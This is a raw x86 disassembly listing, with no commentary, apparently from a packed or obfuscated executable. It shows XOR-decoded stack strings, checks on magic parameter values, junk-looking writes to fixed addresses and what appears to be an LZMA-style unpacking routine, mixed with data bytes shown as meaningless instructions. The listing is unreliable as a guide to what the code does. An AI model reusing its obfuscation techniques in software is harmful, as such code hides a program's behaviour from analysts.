  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	mov    ecx,ecx
  4165c6:	mov    esi,0x87b12b8d
  4165cb:	dec    esp
  4165cc:	mov    bl,0xd3
  4165ce:	add    al,0x19
  4165d0:	iret   
  4165d1:	(bad)  
  4165d3:	cmp    DWORD PTR [ecx],eax
  4165d5:	add    BYTE PTR [eax],al
  4165d7:	add    BYTE PTR [ebx+0x3a],al
  4165da:	pop    esp
  4165db:	inc    ebx
  4165dc:	jne    0x416650
  4165de:	jb     0x416645
  4165e0:	outs   dx,BYTE PTR ds:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
